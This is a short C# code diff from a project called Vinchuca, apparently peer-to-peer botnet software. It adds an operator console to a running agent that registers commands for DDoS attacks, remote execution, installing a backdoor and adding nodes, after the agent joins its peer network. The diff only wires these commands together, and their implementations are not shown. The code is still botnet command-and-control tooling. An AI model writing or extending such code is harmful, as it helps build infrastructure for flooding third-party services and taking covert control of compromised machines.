@@ -1,5 +1,6 @@
 using System;
 using System.Collections.Generic;
+using Mono.Options;
 using Vinchuca.Network;
 using Vinchuca.Network.Protocol.Peers;
 using Vinchuca.REPL;
@@ -45,6 +46,30 @@ namespace Vinchuca
             agent.Bootstrap(peers);
 
             var repl = new CommandLineReader();
+
+            var suite = new CommandSet("vicha") {
+		        "usage: COMMAND [OPTIONS]+.",
+                "Available commands are:",
+                "",
+                // { "v:", "verbosity", (int? v) => Verbosity = v.HasValue ? v.Value : Verbosity+1 },
+		        // Commands may also be specified
+		        new DDoSCommand(agent),
+                new ExecuteCommand(agent),
+                new BackdoorCommand(agent),
+                new AddNodeCommand(agent),
+                new DebugCommand(agent),
+                new Command("clear", "Clear the screen")
+                {
+                    Run = x=>repl.Clear()
+                },
+                new Command("exit", "Finished the control seesion and close the agent")
+                {
+                    Run = x=>Environment.Exit(0)
+                }
+            };
+
+            repl.NewCommand += (sender, eventArgs) => 
+                suite.Run(eventArgs.Command.Split(new char[] {' '}, StringSplitOptions.RemoveEmptyEntries));
             repl.Run();
             //var c = Console.ReadKey(true);
             //while(c.Key != ConsoleKey.Spacebar)
